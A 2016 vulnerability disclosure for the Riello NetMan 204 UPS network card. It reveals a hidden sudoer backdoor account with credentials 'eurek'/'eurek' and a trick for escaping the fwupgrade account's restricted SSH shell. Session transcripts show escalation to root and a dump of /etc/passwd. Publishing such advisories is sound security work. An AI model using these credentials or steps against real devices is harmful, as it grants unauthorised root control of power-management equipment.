NetMan 204 - Backdoor Account

Author: Saeed reza Zamanian [penetrationtest @ Linkedin]
  
Product: NetMan 204
Vendor: http://www.riello-ups.com
Product URL: http://www.riello-ups.com/products/4-software-connectivity/85-netman-204
Quick Reference Installation Manual : http://www.riello-ups.com/uploads/file/325/1325/0MNACCSA4ENQB__MAN_ACC_NETMAN_204_QST_EN_.pdf
 
Date: 23 Sep 2016

About Product:
----------------------
The NetMan 204 network agent allows UPS directly connected over LAN 10/100 Mb connections to be managed using the main network communication protocols (TCP /IP , HTTP HTTPS, SSH, SNMPv1, SNMPv2 and SNMPv3).
It is the ideal solution for the integration of UPS over Ethernet networks with Modbus/TCP and BACnet/IP protocols. It was developed to integrate UPS into medium-sized and large networks,
to provide a high level of reliability in communication between the UPS and associated management systems.

Vulnerability Report:
----------------------
The UPS Module has 3 default accounts, (admin,fwupgrade,user) , fwupgrade has a shell access to the device BUT if you try to get access to the shell a shell script closes your conection.
to stop the shell script and avoid to terminate your connection you should , set your SSH client to execute "/bin/bash" after you logon the SSH. as a result your shell type will be changed to "/bin/bash"
as you see below there is an account called "eurek" and ofcourse it's password also is "eurek".
Since that "eurek" is a sudoer user you will get full access to the device.

Enjoy It!


login as: eurek
eurek@172.19.16.33's password:
Could not chdir to home directory /home/eurek: No such file or directory
eurek@UPS:/$ id
uid=1000(eurek) gid=1000(eurek) groups=1000(eurek),27(sudo)
eurek@UPS:/$ sudo bash
[sudo] password for eurek:
root@UPS:/# id
uid=0(root) gid=0(root) groups=0(root)
root@UPS:/#



login as: fwupgrade
fwupgrade@172.19.16.33's password:
fwupgrade@UPS:/home/fwupgrade$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
messagebus:x:102:104::/var/run/dbus:/bin/false
eurek:x:1000:1000:eurek,,,:/home/eurek:/bin/bash
postfix:x:103:106::/var/spool/postfix:/bin/false
statd:x:104:65534::/var/lib/nfs:/bin/false
pulse:x:105:110:PulseAudio daemon,,,:/var/run/pulse:/bin/false
rtkit:x:106:112:RealtimeKit,,,:/proc:/bin/false
admin:x:1001:1001:,,,:/home/./admin:/bin/bash
fwupgrade:x:1002:1002:,,,:/home/./fwupgrade:/bin/bash
user:x:1003:1003:,,,:/home/user:/bin/bash
ftp:x:107:113:ftp daemon,,,:/srv/ftp:/bin/false
fwupgrade@UPS:/home/fwupgrade$



# EOF